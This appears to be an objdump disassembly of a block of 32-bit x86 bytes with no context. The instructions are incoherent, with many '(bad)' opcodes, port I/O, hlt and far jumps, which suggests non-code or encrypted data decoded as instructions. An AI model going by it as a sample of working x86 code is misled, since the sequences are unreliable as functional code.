  4214fb:	push   eax
  4214fc:	sbb    al,0xe5
  4214fe:	out    0x1f,eax
  421500:	push   edi
  421501:	dec    ebp
  421502:	bswap  eax
  421504:	hlt    
  421505:	mov    esp,0x5fd41576
  42150a:	mov    ebx,0x465b26b4
  42150f:	test   al,0xe6
  421511:	xchg   esp,eax
  421512:	adc    BYTE PTR [ecx+0x6b854897],ah
  421518:	mov    bh,0x88
  42151a:	cwde   
  42151b:	adc    al,dl
  42151d:	add    cl,BYTE PTR [esi+0x264a59ff]
  421523:	xchg   ebx,eax
  421524:	push   ebp
  421525:	sbb    DWORD PTR [ecx],esp
  421527:	pop    esi
  421528:	push   ds
  421529:	fnstenv [ebx-0x1a0b3048]
  42152f:	stc    
  421530:	out    0xc2,eax
  421532:	hlt    
  421533:	add    DWORD PTR [ecx+ebp*2+0x49],edi
  421537:	sbb    al,bh
  421539:	int    0x57
  42153b:	aad    0x45
  42153d:	fs test eax,0x16d4a55e
  421543:	sub    dl,BYTE PTR [edx+0x5ccd5d8]
  421549:	sbb    ebx,DWORD PTR [ecx-0x6]
  42154c:	mov    ah,cl
  42154e:	lock mov ebp,0xefe1ed13
  421554:	sbb    eax,0x1cc127d7
  421559:	and    ah,BYTE PTR [ecx+0x67]
  42155c:	mov    ds:0xef4de4f5,eax
  421561:	in     eax,0xb2
  421563:	mov    bh,0xfc
  421565:	in     al,dx
  421566:	sub    DWORD PTR [edi+0x24],0xffffffa7
  42156a:	ret    
  42156b:	mov    edi,0x479131a9
  421570:	fbstp  TBYTE PTR [ecx]
  421572:	dec    esp
  421573:	jns    0x42152a
  421575:	out    0x90,eax
  421577:	jae    0x4214ff
  421579:	sub    BYTE PTR [esi+eiz*1],dl
  42157c:	arpl   di,ax
  42157e:	and    ch,bl
  421580:	cli    
  421581:	cmp    esi,DWORD PTR [eax-0x4467acba]
  421587:	shl    BYTE PTR [ebx],0x6a
  42158a:	add    bh,BYTE PTR [edi]
  42158c:	nop
  42158d:	mov    al,ds:0xf2e5805f
  421592:	adc    esi,DWORD PTR [esi-0x7f]
  421595:	or     bl,BYTE PTR [edx-0x48f6ebfd]
  42159b:	sar    DWORD PTR [ebp+0x27e45431],cl
  4215a1:	mov    ah,0x66
  4215a3:	ds nop
  4215a5:	stos   BYTE PTR es:[edi],al
  4215a6:	and    eax,0xdee6f882
  4215ab:	adc    al,0xde
  4215ad:	mov    ecx,0x301f9c4c
  4215b2:	mov    ch,0xa1
  4215b4:	ja     0x421573
  4215b6:	loop   0x421635
  4215b8:	pop    eax
  4215b9:	mov    ds:0xb2b06d92,eax
  4215be:	jno    0x421608
  4215c0:	das    
  4215c1:	out    dx,eax
  4215c2:	push   esi
  4215c3:	cs mov ebp,0x3e20b0fe
  4215c9:	setg   BYTE PTR ds:0xf10942fd
  4215d0:	mov    dl,0xda
  4215d2:	xchg   ebp,eax
  4215d3:	fdivp  st(3),st
  4215d5:	lahf   
  4215d6:	pop    ss
  4215d7:	mov    ch,0x67
  4215d9:	cmp    ah,BYTE PTR [ebx-0x597a62d6]
  4215df:	inc    eax
  4215e0:	mov    edx,0xf3999f7c
  4215e5:	(bad)  
  4215e6:	cmc    
  4215e7:	jb     0x42157f
  4215e9:	xchg   edi,eax
  4215ea:	scas   al,BYTE PTR es:[edi]
  4215eb:	push   ss
  4215ec:	outs   dx,DWORD PTR ds:[esi]
  4215ed:	pop    ecx
  4215ee:	xchg   ebx,eax
  4215ef:	mov    esp,0xec9164e8
  4215f4:	cwde   
  4215f5:	ror    BYTE PTR [eax],0xf4
  4215f8:	push   ecx
  4215f9:	jno    0x4215f2
  4215fb:	nop
  4215fc:	mov    bh,0x26
  4215fe:	into   
  4215ff:	jge    0x421660
  421601:	cmp    ebp,ebp
  421603:	jl     0x421638
  421605:	retf   0x5bd4
  421608:	adc    eax,0xf6464390
  42160d:	pop    ecx
  42160e:	jecxz  0x42160f
  421610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421611:	lock ret 
  421613:	js     0x4215cf
  421615:	sub    ch,BYTE PTR [edi+0x63]
  421618:	lods   al,BYTE PTR ds:[esi]
  421619:	out    dx,eax
  42161a:	in     eax,dx
  42161b:	mov    ds:0xc1711b87,al
  421620:	adc    al,0x22
  421622:	lahf   
  421623:	xor    DWORD PTR [esi+0x46df0794],eax
  421629:	jmp    DWORD PTR [edx-0x53]
  42162c:	stos   BYTE PTR es:[edi],al
  42162d:	test   eax,0x986f0e32
  421632:	pop    edi
  421633:	jle    0x421615
  421635:	cmp    eax,0xa5ef1b46
  42163a:	mov    cl,0x67
  42163c:	call   0x2caff5ea
  421641:	sbb    DWORD PTR [eax+0x18],0xffffff8b
  421645:	loop   0x4215f7
  421647:	lods   eax,DWORD PTR ds:[esi]
  421648:	ds stos BYTE PTR es:[edi],al
  42164a:	fdivp  st(0),st
  42164c:	mov    ecx,0x3dadc89a
  421651:	or     eax,0xdef512df
  421656:	jg     0x421612
  421658:	ret    
  421659:	fdivr  QWORD PTR [esi-0x1376e477]
  42165f:	pop    es
  421660:	in     al,dx
  421661:	xor    dl,BYTE PTR [ebp+esi*8-0x60]
  421665:	push   es
  421666:	and    ebx,DWORD PTR [ebx-0x34]
  421669:	addr16 jns 0x42167e
  42166c:	xchg   ecx,eax
  42166d:	jg     0x4215f8
  42166f:	add    esi,DWORD PTR [eax+0x3985d98f]
  421675:	mov    bh,0x9a
  421677:	test   eax,0x6d2e1d57
  42167c:	scas   al,BYTE PTR es:[edi]
  42167d:	xchg   BYTE PTR [ebp+0x32],bl
  421680:	rcl    DWORD PTR [edx+0x33],1
  421683:	push   esp
  421684:	stc    
  421685:	or     BYTE PTR [eax+esi*4+0x44],cl
  421689:	aad    0xe1
  42168b:	shl    BYTE PTR [eax+0x1d],cl
  42168e:	mov    ebp,0x299ace23
  421693:	pop    ss
  421694:	iret   
  421695:	jmp    0x421685
  421697:	xchg   esp,eax
  421698:	dec    ebp
  421699:	sub    al,0xfd
  42169b:	retf   0x623
  42169e:	xchg   esp,eax
  42169f:	fcomp  st(5)
  4216a1:	inc    esp
  4216a2:	cdq    
  4216a3:	call   0x5692:0xa2ab07ba
  4216aa:	scas   eax,DWORD PTR es:[edi]
  4216ab:	in     eax,0x46
  4216ad:	adc    ebx,ebx
  4216af:	fs xchg edx,eax
  4216b1:	ins    BYTE PTR es:[edi],dx
  4216b2:	mov    ch,0x8a
  4216b4:	shr    DWORD PTR [edx-0x2750f83a],cl
  4216ba:	mov    bh,0xea
  4216bc:	ins    DWORD PTR es:[edi],dx
  4216bd:	mov    cl,0x38
  4216bf:	ins    BYTE PTR es:[edi],dx
  4216c0:	sub    al,0xda
  4216c2:	je     0x4216f5
  4216c4:	or     BYTE PTR [edx-0xef4efa6],bh
  4216ca:	push   es
  4216cb:	imul   esi,edi,0xffffffe1
  4216ce:	and    ch,dh
  4216d0:	push   cs
  4216d1:	(bad)  
  4216d2:	mov    bh,bl
  4216d4:	bound  esp,QWORD PTR [edx+0xd]
  4216d7:	pop    ss
  4216d8:	mov    bh,al
  4216da:	inc    ebx
  4216db:	dec    esi
  4216dc:	adc    DWORD PTR [eax],ebp
  4216de:	mov    ds:0xf85d940c,al
  4216e3:	test   DWORD PTR [edx+edi*2],0xea8925fa
  4216ea:	in     eax,dx
  4216eb:	mov    dh,0xe8
  4216ed:	xchg   esp,eax
  4216ee:	test   eax,0xc2e2beaa
  4216f3:	imul   eax,DWORD PTR [esi+ebp*4],0xffffffa0
  4216f7:	div    BYTE PTR [ebx*1-0x7d88341b]
  4216fe:	inc    eax
  4216ff:	push   ecx
  421700:	pop    edx
  421701:	xchg   edx,eax
  421702:	dec    edx
  421703:	rol    DWORD PTR [esi+0x51],0x10
  421707:	xchg   ecx,eax
  421708:	mov    esi,0xee71282b
  42170d:	rcl    BYTE PTR [esi],cl
  42170f:	add    DWORD PTR [esi],edx
  421711:	into   
  421712:	addr16 mov edi,0xa4e8f68c
  421718:	push   0x62
  42171a:	push   0x29
  42171c:	loop   0x42177e
  42171e:	jg     0x42171a
  421720:	jmp    0x4216ec
  421722:	jecxz  0x4216f6
  421724:	test   BYTE PTR [esi+edx*2],al
  421727:	jae    0x4216cb
  421729:	xor    dl,bh
  42172b:	jnp    0x4216cb
  42172d:	mov    ds,ebp
  42172f:	mov    ebp,0x377d0d2f
  421734:	stos   BYTE PTR es:[edi],al
  421735:	jmp    0x6dcb:0xd2a0f3b3
  42173c:	xchg   ecx,eax
  42173d:	into   
  42173e:	dec    esp
  42173f:	cld    
  421740:	mov    dh,0x6f
  421742:	push   0x3f
  421744:	adc    al,bl
  421746:	add    eax,0xadedf4f9
  42174b:	addr16 mov eax,0xc890c120
  421751:	xchg   ecx,eax
  421752:	mov    ah,0xce
  421754:	mov    ah,0x51
  421756:	into   
  421757:	push   edx
  421758:	mov    ds:0xb7da1ce0,eax
  42175d:	cmp    dl,al
  42175f:	scas   al,BYTE PTR es:[edi]
  421760:	into   
  421761:	add    al,0xe
  421763:	cvtps2pd xmm2,QWORD PTR [edi+0x5daea6fb]
  42176a:	xchg   ebx,eax
  42176b:	cdq    
  42176c:	ror    DWORD PTR [ebx+0x72306707],1
  421772:	or     BYTE PTR [edi-0x5d5e5bfa],0x42
  421779:	xchg   edx,eax
  42177a:	dec    BYTE PTR [esi+eiz*4+0x16]
  42177e:	std    
  42177f:	test   al,0xd1
  421781:	call   0x733c8b1d
  421786:	cmovno ebp,DWORD PTR [eax-0x5aaebaf8]
  42178d:	(bad)  
  42178e:	or     al,0xc0
  421790:	out    dx,eax
  421791:	and    dh,BYTE PTR [ebp+0x53]
  421794:	loop   0x42177d
  421796:	das    
  421797:	out    0x5c,al
  421799:	pusha  
  42179a:	popa   
  42179b:	dec    ebp
  42179c:	loopne 0x42179d
  42179e:	cmp    esi,edi
  4217a0:	jmp    0xda18:0x1b8d0c53
  4217a7:	inc    ebx
  4217a8:	aad    0x49
  4217aa:	pop    esp
  4217ab:	(bad)  
  4217ad:	fidiv  WORD PTR [eax-0x55205a30]
  4217b3:	add    BYTE PTR [ecx],dl
  4217b5:	and    dh,al
  4217b7:	push   cs
  4217b8:	arpl   WORD PTR [ebp+ecx*8-0x66],sp
  4217bc:	loopne 0x421760
  4217be:	and    dh,BYTE PTR [ebx]
  4217c0:	test   eax,ecx
  4217c2:	xor    eax,0xaba938b1
  4217c7:	push   0x2e025acd
  4217cc:	(bad)  
  4217ce:	stos   BYTE PTR es:[edi],al
  4217cf:	cmp    BYTE PTR [esi-0x4be84033],al
  4217d5:	iret   
  4217d6:	xor    DWORD PTR [esi],ebp
  4217d8:	cld    
  4217d9:	jne    0x42175e
  4217db:	retf   
  4217dc:	sbb    DWORD PTR [eax+0x5e2318aa],0xffffff95
  4217e3:	mov    esp,DWORD PTR [ebx-0x4]
  4217e6:	(bad)  [edi-0x64]
  4217e9:	sub    edi,edx
  4217eb:	xor    BYTE PTR [edi+0xd],0x46
  4217ef:	push   0x43fcdcd9
  4217f4:	push   edx
  4217f5:	in     eax,dx
  4217f6:	mov    ds:0x579b595d,eax
  4217fb:	pop    esp
  4217fc:	dec    ebx
  4217fd:	out    dx,eax
  4217fe:	aad    0x4a
  421800:	stos   BYTE PTR es:[edi],al
  421801:	int3   
  421802:	rcl    DWORD PTR [edx+0x4581156],1
  421808:	xchg   edx,ebp
  42180a:	mov    cl,0x6b
  42180c:	xor    al,0x60
  42180e:	adc    eax,esp
  421810:	xchg   esi,eax
  421811:	rcl    DWORD PTR [ecx+edx*1+0x46051f10],cl
  421818:	xchg   edx,eax
  421819:	and    bh,cl
  42181b:	or     BYTE PTR [edi],ah
  42181d:	push   ss
  42181e:	xchg   bl,cl
  421820:	inc    BYTE PTR [ebx+0x0]
  421823:	lea    ebp,[ecx-0x7e0de23e]
  421829:	xchg   BYTE PTR [esi+0x46],bl
  42182c:	mov    bh,0xbd
  42182e:	push   ebp
  42182f:	xchg   BYTE PTR [ecx],bh
  421831:	popf   
  421832:	add    cl,al
  421834:	dec    edi
  421835:	icebp  
  421836:	mov    ds:0x4411d5ed,eax
  42183b:	lock push ecx
  42183d:	(bad)  
  42183e:	std    
  42183f:	push   edx
  421840:	cmp    edi,DWORD PTR [ebp-0x71f50783]
  421846:	xor    BYTE PTR [ecx+0x7f],bh
  421849:	sub    eax,0x441575a4
  42184e:	mov    eax,0x3c62cbf1
  421853:	sar    DWORD PTR [bx],0xaa
  421857:	in     eax,dx
  421858:	push   ss
  421859:	jb     0x421883
  42185b:	add    DWORD PTR [ebp-0x7f],esp
  42185e:	int    0x3a
  421860:	jb     0x421873
  421862:	and    DWORD PTR [esi-0x585daf87],edx
  421868:	xchg   ecx,eax
  421869:	inc    eax
  42186a:	xchg   edx,eax
  42186b:	sbb    BYTE PTR [edx-0x420fb9c9],dh
  421871:	pushf  
  421872:	popf   
  421873:	xor    BYTE PTR [eax],al
  421875:	cmp    BYTE PTR [edx+ebp*2-0x4e7e5058],ah
  42187c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42187d:	sub    eax,0x41a3b5bb
  421882:	sbb    al,0xed
  421884:	enter  0x757e,0xfa
  421888:	inc    esp
  421889:	push   ebx
  42188a:	push   cs
  42188b:	xor    esp,eax
  42188d:	sahf   
  42188e:	mov    BYTE PTR [eax+edi*2+0x27],dh
  421892:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421893:	xor    eax,0x54967a6a
  421898:	xchg   edx,eax
  421899:	xor    edi,0x47
  42189c:	test   al,0x3d
  42189e:	cmp    eax,0x9b2465ca
  4218a3:	inc    eax
  4218a4:	jmp    0x421900
  4218a6:	ret    
  4218a7:	pop    esi
  4218a8:	shl    BYTE PTR [eax+ebp*1+0x53],0x81
  4218ad:	or     dh,BYTE PTR [eax-0x12]
  4218b0:	xor    ebx,DWORD PTR [edi]
  4218b2:	lods   eax,DWORD PTR ds:[esi]
  4218b3:	push   0x6a1c6b73
  4218b8:	sub    cl,BYTE PTR ds:0xe8990a68
  4218be:	adc    eax,DWORD PTR [ecx]
  4218c0:	add    DWORD PTR ds:0x91819005,0x2401b01a
  4218ca:	push   ebx
  4218cb:	xchg   BYTE PTR ds:0xa652c6d0,ah
  4218d1:	and    eax,0x23d5e13a
  4218d6:	retf   
  4218d7:	loopne 0x4218f9
  4218d9:	pop    ebx
  4218da:	out    dx,al
  4218db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218dc:	mov    eax,0x68ef55f7
  4218e1:	jne    0x421944
  4218e3:	test   DWORD PTR [edi-0x48],ecx
  4218e6:	mov    al,0xc
  4218e8:	xchg   edi,eax
  4218e9:	dec    ebp
  4218ea:	fild   DWORD PTR ds:0x8fe8e509
  4218f0:	push   ebp
  4218f1:	mov    esi,0x88e7616e
  4218f6:	je     0x42190e
  4218f8:	sbb    eax,0xa28abd6f
  4218fd:	hlt    
  4218fe:	lods   al,BYTE PTR ds:[esi]
  4218ff:	push   edx
  421900:	dec    ebx
  421901:	push   ebp
  421902:	xor    BYTE PTR [edx],0xbb
  421905:	push   es
  421906:	bnd jnp 0x42192c
  421909:	out    dx,al
  42190a:	inc    esp
  42190b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42190c:	add    al,0xe1
  42190e:	pop    edi
  42190f:	out    0x29,al
  421911:	(bad)  
  421913:	pop    es
  421914:	inc    esp
  421915:	aas    
  421916:	js     0x421962
  421918:	cwde   
  421919:	xlat   BYTE PTR ds:[ebx]
  42191a:	fdivr  QWORD PTR [eax]
  42191c:	push   ebp
  42191d:	push   ebp
  42191e:	cmp    eax,0xe1d6d070
  421923:	dec    eax
  421924:	xchg   DWORD PTR [ebp+0x4704623f],ebp
  42192a:	inc    esi
  42192b:	sbb    al,0x4b
  42192d:	or     al,0x1a
  42192f:	add    eax,0xf4f07371
  421934:	jnp    0x421921
  421936:	in     al,0xcd
  421938:	ss js  0x42195a
  42193b:	mov    ebp,0x6300eb12
  421940:	pusha  
  421941:	inc    ebp
  421942:	add    BYTE PTR [edi+0x47c8f2f1],ah
  421948:	sbb    al,ch
  42194a:	mov    BYTE PTR [esi],al
  42194c:	icebp  
  42194d:	imul   DWORD PTR [ecx+0x1cac8536]
  421953:	mov    al,0xf3
  421955:	arpl   dx,di
  421957:	and    al,0xdb
  421959:	lds    ecx,FWORD PTR [ebx+0x45e6c417]
  42195f:	mov    BYTE PTR [edx+esi*1],al
  421962:	sti    
  421963:	adc    ah,BYTE PTR [edx-0x70]
  421966:	arpl   WORD PTR [ecx],bp
  421968:	inc    ecx
  421969:	aas    
  42196a:	mov    ds,WORD PTR [esi-0x73cd6aaa]
  421970:	dec    ebx
  421971:	rcl    edx,cl
  421973:	or     al,BYTE PTR [esi]
  421975:	addr16 cdq 
  421977:	or     DWORD PTR [edi-0x28],esi
  42197a:	push   ss
  42197b:	mov    BYTE PTR [esi],0x9e
  42197e:	sbb    BYTE PTR [ebx+0x6af9092e],cl
  421984:	leave  
  421985:	jmp    0x42194d
  421987:	pop    esi
  421988:	pop    ss
  421989:	scas   eax,DWORD PTR es:[edi]
  42198a:	sbb    eax,0xeee21011
  42198f:	add    edi,DWORD PTR [edx+0x3e]
  421992:	xchg   ebx,eax
  421993:	jmp    0x4219b1
  421995:	ins    BYTE PTR es:[edi],dx
  421996:	adc    eax,0x184fd769
  42199b:	imul   ecx,DWORD PTR [edi-0x22],0xcf50b884
  4219a2:	mov    dl,0x7f
  4219a4:	jb     0x4219a1
  4219a6:	fist   WORD PTR cs:[ebx-0x3f]
  4219aa:	push   cs
  4219ab:	push   eax
  4219ac:	mov    dh,BYTE PTR [edi+0x4f86764f]
  4219b2:	imul   DWORD PTR [edi+0x24]
  4219b5:	mov    DWORD PTR [ebx],edi
  4219b7:	mov    ds:0xd12e35a3,eax
  4219bc:	fs and dh,0xd6
  4219c0:	icebp  
  4219c1:	mov    cl,0x22
  4219c3:	aaa    
  4219c4:	lods   eax,DWORD PTR ds:[esi]
  4219c5:	stc    
  4219c6:	xor    DWORD PTR [eax+edi*2],ebx
  4219c9:	and    eax,0x9c82863
  4219ce:	fcmovnu st,st(6)
  4219d0:	push   edi
  4219d1:	inc    ebp
  4219d2:	call   0x4e35:0x327d412d
  4219d9:	push   es
  4219da:	push   edi
  4219db:	and    DWORD PTR [edi-0x5e1e1efe],ebx
  4219e1:	pop    ss
  4219e2:	bound  ecx,QWORD PTR [ecx]
  4219e4:	into   
  4219e5:	into   
  4219e6:	pop    ecx
  4219e7:	xor    DWORD PTR [esi],ebx
  4219e9:	and    ebp,edi
  4219eb:	jns    0x421982
  4219ed:	fs inc edi
  4219ef:	xlat   BYTE PTR ds:[ebx]
  4219f0:	and    eax,0xcb28633c
  4219f5:	rcr    DWORD PTR [edi],cl
  4219f7:	mov    WORD PTR ds:0x96b4b93a,gs
  4219fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219fe:	push   cs
  4219ff:	sub    ebp,edi
  421a01:	mov    ecx,0x38a01244
  421a06:	pop    es
  421a07:	inc    eax
  421a08:	cwde   
  421a09:	sub    BYTE PTR [edi],bl
  421a0b:	div    BYTE PTR [ebx+0xb]
  421a0e:	sti    
  421a0f:	cdq    
  421a10:	jmp    0x421a00
  421a12:	fsub   st,st(0)
  421a14:	xchg   esi,eax
  421a15:	lahf   
  421a16:	sbb    al,0x2f
  421a18:	test   BYTE PTR [edx],al
  421a1a:	(bad)  
  421a1b:	jl     0x4219ae
  421a1d:	push   eax
  421a1e:	dec    ebp
  421a1f:	mov    ecx,0xe7cf8dd4
  421a24:	(bad)
  421a27:	push   esi
  421a28:	mov    cl,0x4f
  421a2a:	jecxz  0x4219ca
  421a2c:	inc    ecx
  421a2d:	popa   
  421a2e:	and    bl,0xce
  421a31:	adc    ch,BYTE PTR [ecx+esi*8+0x1d]
  421a35:	mov    al,0x4f
  421a37:	mov    edi,0xca8dc75
  421a3c:	out    0x73,al
  421a3e:	(bad)  
  421a3f:	(bad)  
  421a41:	cli    
  421a42:	fcom   DWORD PTR [edi+0x2d]
  421a45:	inc    edi
  421a46:	and    ch,BYTE PTR ds:0xe5b07f65
  421a4c:	loop   0x4219ea
  421a4e:	dec    eax
  421a4f:	cmp    ah,bl
  421a51:	call   0x126efd7d
  421a56:	sub    eax,0xeefc90b4
  421a5b:	bound  eax,QWORD PTR [ecx+0x5a26a718]
  421a61:	pushf  
  421a62:	add    eax,0x44aae5
  421a67:	sbb    ebx,ebp
  421a69:	out    0x3a,al
  421a6b:	jle    0x421a97
  421a6d:	sahf   
  421a6e:	or     ah,BYTE PTR [edi]
  421a70:	in     eax,dx
  421a71:	popf   
  421a72:	stos   BYTE PTR es:[edi],al
  421a73:	push   esp
  421a74:	fild   QWORD PTR [edx+0x699c7e89]
  421a7a:	adc    BYTE PTR [esi+0x3f],dl
  421a7d:	and    BYTE PTR [esi+0x4a29e00f],dh
  421a83:	xor    al,0x27
  421a85:	lods   al,BYTE PTR ds:[esi]
  421a86:	add    edi,DWORD PTR [ebx+ecx*1]
  421a89:	cli    
  421a8a:	add    dh,bh
  421a8c:	xor    ebp,ecx
  421a8e:	(bad)  
  421a8f:	mov    esi,DWORD PTR [eax+0x5a]
  421a92:	hlt    
  421a93:	add    BYTE PTR [ebx+ebp*8-0x3704c19],bl
  421a9a:	and    eax,0x4d594f59
  421a9f:	ret    
  421aa0:	dec    esi
  421aa1:	cmc    
  421aa2:	ret    
  421aa3:	or     dh,BYTE PTR [esi-0xb]
  421aa6:	inc    ebp
  421aa8:	call   0x2917dd78
  421aad:	dec    edi
  421aae:	pop    ecx
  421aaf:	test   eax,0x3d8108e3
  421ab4:	xor    bl,BYTE PTR ss:[esi+0x10]
  421ab8:	es inc ebx
  421aba:	push   edi
  421abb:	or     eax,0xa79638e9
  421ac0:	aas    
  421ac1:	pop    ss
  421ac2:	and    al,0x17
  421ac4:	push   edi
  421ac5:	lock imul edx,eax,0x2a
  421ac9:	mov    bl,0x95
  421acb:	pusha  
  421acc:	call   0x4ba:0x2295b85f
  421ad3:	push   ebp
  421ad4:	mov    dh,0x49
  421ad6:	mov    es,WORD PTR [ecx-0xd18e48]
  421adc:	push   cs
  421add:	sbb    eax,DWORD PTR [edx]
  421adf:	stos   BYTE PTR es:[edi],al
  421ae0:	daa    
  421ae1:	jne    0x421ae6
  421ae3:	in     al,0xd2
  421ae5:	sub    BYTE PTR [ebp+0x24],dl
  421ae8:	int    0xcc
  421aea:	gs cli 
  421aec:	jae    0x421b04
  421aee:	mov    ebx,0x7e8750d4
  421af3:	sub    DWORD PTR [edx-0x3d22a1f0],0x99327c83
  421afd:	popa   
  421afe:	xor    edi,ebp
  421b00:	repnz pop es
  421b02:	push   0x65
  421b04:	adc    BYTE PTR [ebp-0x54],ah
  421b07:	stos   DWORD PTR es:[edi],eax
  421b08:	aaa    
  421b09:	pop    eax
  421b0a:	pop    esp
  421b0b:	dec    edx
  421b0c:	inc    esi
  421b0d:	sti    
  421b0e:	test   BYTE PTR [esi],ah
  421b10:	cs add eax,0xde3ab57e
  421b16:	inc    edx
  421b17:	cdq    
  421b18:	add    eax,0x289617dd
  421b1d:	mov    WORD PTR [ebx-0x43],ds
  421b20:	and    esi,esi
  421b22:	ds out dx,al
  421b24:	(bad)  
  421b25:	cld    
  421b26:	cmp    BYTE PTR [esi+eiz*8],bl
  421b29:	ret    0x57c7
  421b2c:	sbb    ecx,esi
  421b2e:	pop    es
  421b2f:	mov    esp,0x2d46ce66
  421b34:	loop   0x421b20
  421b36:	sub    BYTE PTR [esi],ah
  421b38:	hlt    
  421b39:	add    ebx,ebx
  421b3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b3c:	in     al,dx
  421b3d:	sbb    ah,al
  421b3f:	mov    edx,DWORD PTR [eax]
  421b41:	xchg   edi,eax
  421b42:	cmp    al,0xb7
  421b44:	sbb    BYTE PTR [ecx],0xb1
  421b47:	mul    BYTE PTR [edx+edi*2]
  421b4a:	shl    BYTE PTR [ecx-0x1e9b1f8],0x54
  421b51:	loopne 0x421bb5
  421b53:	in     al,dx
  421b54:	daa    
  421b55:	mov    eax,0x19beab31
  421b5a:	inc    ebx
  421b5b:	repnz cld 
  421b5d:	ins    BYTE PTR es:[edi],dx
  421b5e:	mov    ds:0xd504131f,eax
  421b63:	sti    
  421b64:	ficomp WORD PTR [eax]
  421b66:	cmc    
  421b67:	dec    edi
  421b68:	(bad)  
  421b69:	jns    0x421b23
  421b6b:	or     bl,BYTE PTR [esi+0x52]
  421b6e:	add    ch,0x38
  421b71:	(bad)
  421b74:	lea    edx,[esi-0x35]
  421b77:	repz jmp ebp
  421b7a:	cli    
  421b7b:	cdq    
  421b7c:	pop    ebx
  421b7d:	sub    BYTE PTR [ecx],0xb1
  421b80:	and    ebx,DWORD PTR [edx+eiz*1]
  421b83:	sbb    al,0x75
  421b85:	push   cs
  421b86:	ror    BYTE PTR [ecx],cl
  421b88:	movq   QWORD PTR fs:[eax+0x5dd07548],mm0
  421b90:	mov    ds:0xa601ae46,eax
  421b95:	jae    0x421c07
  421b97:	xchg   ebx,eax
  421b98:	dec    eax
  421b99:	pushf  
  421b9a:	mov    edx,0x856d1fae
  421b9f:	inc    ebp
  421ba0:	pop    es
  421ba1:	jne    0x421b86
  421ba3:	mov    eax,0x7b300195
  421ba8:	fs jmp 0xcbf4:0x28f1188e
  421bb0:	cmp    WORD PTR [edi+0x67b8e423],si
  421bb7:	adc    DWORD PTR [ebp-0x5c53b72a],ebx
  421bbd:	mov    ds,WORD PTR [ecx+0x3d]
  421bc0:	cli    
  421bc1:	rcr    BYTE PTR [edx],0xc7
  421bc4:	ins    BYTE PTR es:[edi],dx
  421bc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bc6:	pop    edi
  421bc7:	jmp    0x421c20
  421bc9:	inc    eax
  421bca:	mov    edx,0xee5312dd
  421bcf:	mov    esp,0xa7b40c4c
  421bd4:	pop    ecx
  421bd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bd6:	or     eax,0x1bddd946
  421bdb:	js     0x421b7d
  421bdd:	in     eax,dx
  421bde:	sub    esp,DWORD PTR cs:[ecx-0x43]
  421be2:	(bad)  
  421be3:	les    edi,FWORD PTR [eax-0x247fc971]
  421be9:	jecxz  0x421bad
  421beb:	inc    edi
  421bec:	jmp    0x421b72
  421bee:	shr    DWORD PTR [edx+0x2bd98a9b],1
  421bf4:	sbb    eax,0x1da6004d
  421bf9:	ss cli 
  421bfb:	sti    
  421bfc:	popa   
  421bfd:	push   cs
  421bfe:	outs   dx,DWORD PTR ds:[esi]
  421bff:	jmp    0x421be7
  421c01:	xor    ebp,DWORD PTR [eax]
  421c03:	sti    
  421c04:	dec    esp
  421c05:	dec    ebp
  421c06:	or     ch,0x4a
  421c09:	sub    BYTE PTR [ecx+0x61],0xc2
  421c0d:	pop    ds
  421c0e:	or     edx,DWORD PTR [ecx]
  421c10:	cmp    al,ch
  421c12:	mov    esi,0x33df0f6a
  421c17:	pop    DWORD PTR [esi-0xe910e4c]
  421c1d:	clc    
  421c1e:	imul   ebp,DWORD PTR [eax+0xe],0xbb23637c
  421c25:	dec    ebx
  421c26:	jnp    0x421be9
  421c28:	imul   esp,esp,0x22272713
  421c2e:	push   ds
  421c2f:	dec    ebp
  421c30:	xor    bh,BYTE PTR [esi+0x4bba3ff]
  421c36:	jg     0x421c1d
  421c38:	xchg   DWORD PTR [edi-0x17],edi
  421c3b:	out    0xdb,eax
  421c3d:	mov    eax,ds:0x6b700b8f
  421c42:	stc    
  421c43:	xchg   esp,eax
  421c44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c45:	pop    eax
  421c46:	lea    ebp,[edi]
  421c48:	enter  0x6b4,0x73
  421c4c:	loop   0x421bd9
  421c4e:	dec    esi
  421c4f:	fidiv  WORD PTR [ebp-0x27]
  421c52:	xor    al,0xad
  421c54:	not    DWORD PTR [ebx-0x34]
  421c57:	xchg   esi,eax
  421c58:	mov    dl,0xe8
  421c5a:	xchg   ebx,eax
  421c5b:	jne    0x421c17
  421c5d:	fldenv [ebx]
  421c5f:	fadd   QWORD PTR [eax]
  421c61:	mov    al,ds:0xb1752478
  421c66:	repnz fsubr DWORD PTR [edi-0x34]
  421c6a:	ins    BYTE PTR es:[edi],dx
  421c6b:	aaa    
  421c6c:	push   esp
  421c6d:	in     al,0x33
  421c6f:	dec    ebp
  421c70:	sub    BYTE PTR [eax-0x42a42231],0xff
  421c77:	call   0x96ee:0xfd3471ae
  421c7e:	or     eax,0x3c79b1e0
  421c83:	fcom   QWORD PTR [edx-0x2c011bf3]
  421c89:	clc    
  421c8a:	xchg   esi,eax
  421c8b:	mov    ecx,0xdcad43da
  421c90:	sbb    bl,BYTE PTR [ebp+0x16b3c08d]
  421c96:	push   ecx
  421c97:	(bad)  
  421c98:	or     al,0xad
  421c9a:	sub    BYTE PTR [edx-0x10],cl
  421c9d:	adc    dl,0x77
  421ca0:	adc    al,0x23
  421ca2:	xchg   edx,eax
  421ca3:	cmp    DWORD PTR [eax+edx*4-0x59ebe154],0x5e
  421cab:	xchg   edx,eax
  421cac:	xchg   esp,eax
  421cad:	dec    eax
  421cae:	fbstp  TBYTE PTR [edx+0x6b8f6178]
  421cb4:	add    BYTE PTR [eax+0x4992bb9d],0x14
  421cbb:	retf   
  421cbc:	jo     0x421c64
  421cbe:	xor    al,0xd6
  421cc0:	fcomp  DWORD PTR [eax]
  421cc2:	bound  edi,QWORD PTR [ebx+ebp*8-0x67fc810d]
  421cc9:	aaa    
  421cca:	cdq    
  421ccb:	jns    0x421d01
  421ccd:	xchg   ebx,eax
  421cce:	mov    ds:0xd179d022,al
  421cd3:	push   ecx
